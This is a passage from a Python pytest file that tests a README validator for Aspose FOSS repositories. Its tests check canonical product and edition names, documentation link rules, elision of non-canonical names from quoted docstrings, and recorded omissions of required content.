        _candidate(sound.readme + f"\nThe {phrase} extends this with more formats.\n"),
        tmp_path,
        (),
    )
    failure = _failed(document, "BC-06")
    assert failure["causal_stage"] == "COMPOSING"
    assert len(failure["details"]) == 1
    assert failure["details"][0].startswith("non-canonical edition name ")


def test_bc06_names_the_section_a_lowercase_edition_substitute_renders_in(tmp_path: Path) -> None:
    readme = _candidate().readme
    heading = "## Scope and Limitations"
    assert heading in readme
    marked = readme.replace(heading, heading + "\n\nThe commercial edition adds more.", 1)
    document = validate_candidate(_candidate(marked), tmp_path, ())
    failures = _failed(document, "BC-06")["failures"]
    assert [f["section_id"] for f in failures] == ["scope_limitations"]


def test_bc06_passes_without_an_edition_phrase_and_ignores_code(tmp_path: Path) -> None:
    sound = _candidate()
    assert _verdicts(validate_candidate(sound, tmp_path, ()))["BC-06"] == "PASS"
    # Enterprise Edition is the one permitted name; code spans and fences are not prose.
    extra = (
        "\nIt adds more. Read about the Enterprise Edition.\n"
        "Run `commercial edition` and see the `full version` flag.\n"
        "```text\nthe commercial edition and the paid version\n```\n"
    )
    document = validate_candidate(_candidate(sound.readme + extra), tmp_path, ())
    assert _verdicts(document)["BC-06"] == "PASS"


CANONICAL = "Aspose.3D FOSS for Python"


def _bc12(readme: str, tmp_path: Path) -> list[str]:
    document = validate_candidate(_candidate(readme), tmp_path, ())
    check = next(c for c in document["checks"] if c["id"] == "BC-12")
    return list(check["details"]) if check["verdict"] == "FAIL" else []


@pytest.mark.parametrize(
    "variant",
    [
        "Aspose.3D.FOSS for Python",
        "Aspose.3D-FOSS for Python",
        "Aspose.3D_FOSS for Python",
        "Aspose 3D FOSS for Python",
        "Aspose3D FOSS for Python",
        "Aspose.3D.FOSS.for.Python",
        "aspose.3d foss for python",
        "ASPOSE.3D FOSS FOR PYTHON",
        "Aspose.3D FOSS",
        "Aspose.3D.FOSS",
        "Aspose.3D FOSS for Java",
    ],
)
def test_bc12_fails_a_product_name_variant_in_prose(variant: str, tmp_path: Path) -> None:
    sound = _candidate().readme
    assert _bc12(sound, tmp_path) == []
    details = _bc12(sound + f"\n{variant} provides core scene management.\n", tmp_path)
    assert len(details) == 1, details
    assert f"is not the canonical name {CANONICAL!r}" in details[0]


def test_bc12_passes_the_canonical_name_and_technical_identifiers(tmp_path: Path) -> None:
    sound = _candidate().readme
    assert CANONICAL in sound
    spelled = (
        f"\n{CANONICAL} provides core scene management.\n"
        "The package is named aspose-3d-foss at version 26.1.0.\n"
        "Install the aspose-3d-foss package or import `Aspose.3D.FOSS`.\n"
        "The namespace Aspose.3D.FOSS exposes the scene types.\n"
        "Built with Aspose.3D.FOSS version 26.1.0 for netstandard2.0.\n"
        "```text\nAspose.3D.FOSS for Python and aspose_3d_foss\n```\n"
        "See [the repository](https://github.com/aspose-3d-foss/Aspose.3D-FOSS-for-Python).\n"
        "Compare with Aspose.3D for Python, the product page's own name.\n"
    )
    assert _bc12(sound + spelled, tmp_path) == []


def test_bc12_names_the_section_and_routes_to_composing(tmp_path: Path) -> None:
    readme = _candidate().readme
    heading = "## Scope and Limitations"
    marked = readme.replace(heading, heading + "\n\nAspose.3D.FOSS opens every format.", 1)
    document = validate_candidate(_candidate(marked), tmp_path, ())
    failure = _failed(document, "BC-12")
    assert failure["causal_stage"] == "COMPOSING"
    assert [f["section_id"] for f in failure["failures"]] == ["scope_limitations"]


def _lens_fact(docstring: str) -> Fact:
    return Fact(
        "public_symbol:aspose.threed.lens",
        "public_symbol",
        "aspose.threed.Lens",
        (Evidence("aspose/threed/lens.py", "line 1; class; public by name"),),
        attributes={"symbol_kind": "class", "docstring": docstring},
    )


def test_bc12_elides_a_noncanonical_name_from_a_quoted_docstring(tmp_path: Path) -> None:
    # aspose-psd-foss/Aspose.PSD-FOSS-for-Python: a verbatim-quoted upstream docstring named the
    # product without its "for Python" tail. BC-12 correctly refuses to let the repair loop
    # rewrite cited evidence, so the composer elides only the offending substring before the
    # quote ever enters the page, keeping the rest of the quote's own words.
    tainted = _lens_fact("Aspose.3D FOSS provides the lens projection for a camera.")
    facts = FactsDocument(FACTS.repository, FACTS.source_revision, (*FACTS.facts, tainted))
    candidate = _candidate(facts=facts)
    assert "Aspose.3D FOSS provides the lens projection" not in candidate.readme
    assert "… provides the lens projection for a camera." in candidate.readme
    document = validate_candidate(candidate, tmp_path, ())
    assert _verdicts(document)["BC-12"] == "PASS"
    # The elision is recorded for the reviewer, never silent.
    assert any(
        "elided non-canonical name 'Aspose.3D FOSS'" in note and "aspose.threed.Lens" in note
        for note in document["advisory"]
    ), document["advisory"]


def test_bc12_leaves_a_docstring_with_no_noncanonical_name_unchanged(tmp_path: Path) -> None:
    plain = _lens_fact("A lens projection for a camera.")
    facts = FactsDocument(FACTS.repository, FACTS.source_revision, (*FACTS.facts, plain))
    candidate = _candidate(facts=facts)
    assert "A lens projection for a camera." in candidate.readme
    document = validate_candidate(candidate, tmp_path, ())
    assert _verdicts(document)["BC-12"] == "PASS"
    assert document["advisory"] == []


def test_canonical_name_pattern_is_built_from_the_name_alone() -> None:
    pattern = canonical_name_pattern("Aspose.Words FOSS for .NET")
    found = [
        m.group(0) for m in pattern.finditer("Aspose.Words.FOSS for .NET and aspose words-foss")
    ]
    assert found == ["Aspose.Words.FOSS for .NET", "aspose words-foss"]
    # A name with no FOSS segment must match whole.
    whole = canonical_name_pattern("Aspose.Page for Python")
    assert [m.group(0) for m in whole.finditer("Aspose.Page for Python; Aspose.Page")] == [
        "Aspose.Page for Python"
    ]


# The sealed README that carries the bad forms (docs/DECISION_LOG.md 2026-10-05, verification V2
# items 1 and 4): lowercase "commercial edition" on line 550 and "Aspose.3D.FOSS" standing in for
# the product name on lines 169, 550 and 554. The revision directory is immutable; the bundle is
# read, never edited.
SEALED_3D_NET = (
    REPO_ROOT
    / "candidates"
    / "aspose-3d-foss__Aspose.3D-FOSS-for-.NET"
    / "52b0f00ebf28a0b4173921725ff170685ec2c502"
    / "README.md"
)


def test_the_real_sealed_readme_with_the_bad_forms_fails_bc06_and_bc12() -> None:
    if not SEALED_3D_NET.is_file():
        pytest.skip("the pinned sealed revision is not in this checkout")
    readme = SEALED_3D_NET.read_text(encoding="utf-8")
    registry = json.loads((REPO_ROOT / "data" / "registry.json").read_text(encoding="utf-8"))
    entry = RegistryEntry.model_validate(
        next(e for e in registry["entries"] if e["repository"].endswith("Aspose.3D-FOSS-for-.NET"))
    )
    editions = [f.detail for f in _edition_substitute_failures(readme)]
    assert editions == ["non-canonical edition name 'commercial edition'"]
    names = [f.detail for f in _check_canonical_name(SimpleNamespace(entry=entry, readme=readme))]
    canonical = "Aspose.3D FOSS for .NET"
    assert {name.split(" is not")[0] for name in names} == {
        "product name 'Aspose.3D.FOSS for .NET'",
        "product name 'Aspose.3D.FOSS'",
    }
    assert all(name.endswith(f"canonical name {canonical!r}") for name in names)
    # The H1 the renderer owns is the canonical name and is not itself flagged.
    assert readme.splitlines()[0] == "# Aspose.3D FOSS for .NET"


def test_bc06_holds_the_link_ceiling_the_anchor_rule_and_the_edition_rule_together() -> None:
    # One README that breaks all three BC-06 rules reports each, and fixing one leaves the rest.
    nl = chr(10)
    links = [
        _link_fact("d", "https://docs.aspose.org/3d/python/"),
        _link_fact("k", "https://kb.aspose.org/3d/python/"),
        _link_fact("r", "https://reference.aspose.org/3d/python/"),
    ]
    enterprise = Fact(
        "link_target:product.enterprise",
        "link_target",
        ENTERPRISE_URL,
        (Evidence(ENTERPRISE_URL, "HTTP 200; enterprise target"),),
        attributes={"role": "enterprise", "level": "platform", "platform": "python"},
    )
    facts = _with_links(*links, enterprise)
    plan = {
        **PLAN,
        "sections": [
            {**entry, "include": True}
            if entry["section_id"] == "enterprise_relationship"
            else entry
            for entry in PLAN["sections"]
        ],
    }
    row = " ".join(f"[{link.id[-1]}]({link.value})" for link in links)

    def details(anchor: str, sentence: str) -> list[str]:
        readme = nl.join(
            ["# T", "", "A few words.", "", row, "", f"[{anchor}]({ENTERPRISE_URL}) {sentence}", ""]
        )
        candidate = _candidate(readme=readme, facts=facts, plan=plan)
        return [failure.detail for failure in _check_links(candidate)]

    good_anchor = "full-featured Aspose.3D for Python — Enterprise Edition"
    broken = details(
        "Aspose.3D for Python — Enterprise Edition", "The commercial edition adds more."
    )
    assert any("exceed the ceiling" in d for d in broken)
    assert any("full-featured <product>" in d for d in broken)
    assert "non-canonical edition name 'commercial edition'" in broken
    fixed_edition = details(good_anchor, "It adds more.")
    assert any("exceed the ceiling" in d for d in fixed_edition)
    assert not any("edition name" in d or "full-featured" in d for d in fixed_edition)


def test_check_four_honours_a_must_carry_omission_the_authoring_recorded(tmp_path: Path) -> None:
    """G7-W15 (Slides-Java, 620a2614): S6 omitted superseded units 081/083/085 from
    enterprise_relationship with reasons, yet BC-04 re-judged each section with an empty omission
    list, failed them as "missing", and S11 repair pasted the omitted paragraphs back into the
    Enterprise sentence. A recorded, reasoned omission is the explicit disposition; a unit neither
    cited nor omitted - or omitted with a blank reason, or in another section - still fails."""
    unit = "inherited_unit:002.paragraph"
    carry = SectionTask(
        "scope_limitations",
        {},
        ACCEPTED,
        ("scope",),
        must_carry=frozenset({unit}),
        must_carry_text={unit: "Kept verbatim from the old README."},
    )

    def verdict(omitted: list[dict[str, str]]) -> list[str]:
        units = {**copy.deepcopy(UNITS), "omitted": omitted}
        candidate = dataclasses.replace(_candidate(units=units), tasks=[carry])
        document = validate_candidate(candidate, tmp_path, ())
        failures = {check["id"]: check for check in blocking_failures(document)}
        return list(failures["BC-04"]["details"]) if "BC-04" in failures else []

    reason = "Covered by the scope sentence."
    assert verdict([]) != [] and unit in verdict([])[0]
    assert verdict([{"section": "scope_limitations", "fact_id": unit, "reason": reason}]) == []
    assert verdict([{"section": "scope_limitations", "fact_id": unit, "reason": " "}]) != []
    assert verdict([{"section": "development_testing", "fact_id": unit, "reason": reason}]) != []
